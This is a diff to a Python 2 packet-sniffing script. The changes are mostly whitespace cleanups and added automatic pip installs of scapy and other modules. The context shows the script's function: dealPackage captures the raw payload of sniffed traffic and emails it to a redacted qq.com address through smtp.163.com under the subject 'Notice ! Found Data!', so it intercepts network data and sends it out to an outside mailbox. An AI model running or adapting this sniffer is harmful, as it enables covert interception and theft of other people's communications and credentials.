@@ -5,7 +5,7 @@
 from email.mime.text import MIMEText
 from scapy.all import *
 import subprocess
-import smtplib 
+import smtplib
 import time
 import sys
 import os
@@ -74,24 +74,48 @@ def checkInstall():
 	else:
 		print '[√] pip has been installed.'
 
+	# update pip and python modules
+
+	try:
+		os.system('pip install -U pip')
+	except:
+		print '[x] update pip failed.'
+		return
+
 	try:
 		__import__('scapy')
 		print '[√] module scapy been installed.'
 	except:
-		sys.exit('[x] No module named scapy')
+		install = raw_input('[?]  module scapy not found in python, install now? [y/n] ')
+		if install == 'y':
+			os.system('pip install -U scapy')
+		else:
+			sys.exit('[x] No module named scapy')
+			return
+
+	try:
+		os.system('pip install -U smtplib')
+	except:
+		print '[x] update smtplib failed.'
+		return
+
+	try:
+		os.system('pip install -U email')
+	except:
+		print '[x] update email failed.'
 		return
 
 def dealPackage(packet):
-	
+
 	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")
-	
+
 	if len(lines[-1]) > 1 and len(lines) > 1:
 		print '-'*90
 		# reciver,title,body
 		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
 		for line in lines:
 			print line
-			
+
 def sendMail(receiver, title, body):
     host = 'smtp.163.com'
     port = 25
@@ -132,4 +156,3 @@ if __name__ == '__main__':
 
 	print '[*] Start sniff!\n'
 	dosniff()
-	
